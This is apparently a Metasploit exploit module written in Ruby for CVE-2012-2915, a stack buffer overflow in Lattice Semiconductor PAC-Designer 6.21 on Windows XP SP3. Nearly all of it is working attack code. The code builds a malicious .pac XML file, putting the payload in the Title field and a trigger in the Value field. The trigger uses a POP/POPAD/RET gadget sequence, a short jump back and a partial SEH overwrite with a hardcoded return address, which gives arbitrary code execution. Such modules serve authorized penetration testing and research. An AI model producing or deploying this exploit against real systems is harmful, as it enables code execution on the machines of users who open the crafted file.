# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Lattice Semiconductor PAC-Designer 6.21 Symbol Value Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Lattice Semiconductor PAC-Designer
                6.21.  As a .pac file, when supplying a long string of data to the &#039;value&#039; field
                under the &#039;SymbolicSchematicData&#039; tag, it is possible to cause a memory corruption
                on the stack, which results in arbitrary code execution under the context of the
                user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Unknown&#039;,      #Discovery
                    &#039;juan vazquez&#039;, #Metasploit
                    &#039;sinn3r&#039;        #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-2915&#039;],
                    [&#039;OSVDB&#039;, &#039;82001&#039;],
                    [&#039;EDB&#039;, &#039;19006&#039;],
                    [&#039;BID&#039;, &#039;53566&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/48741&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x3c\x3e",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "seh"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;PAC-Designer 6.21 on Windows XP SP3&#039;,
                        {
                            # P/P/R in PACD621.exe
                            # ASLR: False, Rebase: False, SafeSEH: False, OS: False
                            &#039;Ret&#039; => 0x00805020
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "May 16 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [true, &#039;The filename&#039;, &#039;msf.pac&#039;])
            ], self.class)
    end
 
    def exploit
        # The payload is placed in the <title> field
        p = payload.encoded
 
        # The trigger is placed in the <value> field, which will jmp to our
        # payload in the <title> field.
        buf  = "\x5f"    #POP EDI
        buf << "\x5f"    #POP EDI
        buf << "\x5c"    #POP ESP
        buf << "\x61"*6  #POPAD x 6
        buf << "\x51"    #PUSH ECX
        buf << "\xc3"    #RET
        buf << rand_text_alpha(96-buf.length, payload_badchars)
        buf << "\xeb\x9e#{rand_text_alpha(2, payload_badchars)}"  #Jmp back to the beginning of the buffer
        buf << [target.ret].pack(&#039;V&#039;)[0,3] # Partial overwrite
 
        xml = %Q|<?xml version="1.0"?>
<PacDesignData>
    <DocFmtVersion>1</DocFmtVersion>
    <DeviceType>ispPAC-CLK5410D</DeviceType>
    <CreatedBy>PAC-Designer 6.21.1336</CreatedBy>
    <SummaryInformation>
        <Title>#{p}</Title>
        <Author>#{Rex::Text.rand_text_alpha(6)}</Author>
    </SummaryInformation>
 
    <SymbolicSchematicData>
        <Symbol>
            <SymKey>153</SymKey>
            <NameText>Profile 0 Ref Frequency</NameText>
            <Value>#{buf}</Value>
        </Symbol>
    </SymbolicSchematicData>
</PacDesignData>|
 
        file_create(xml)
    end
end



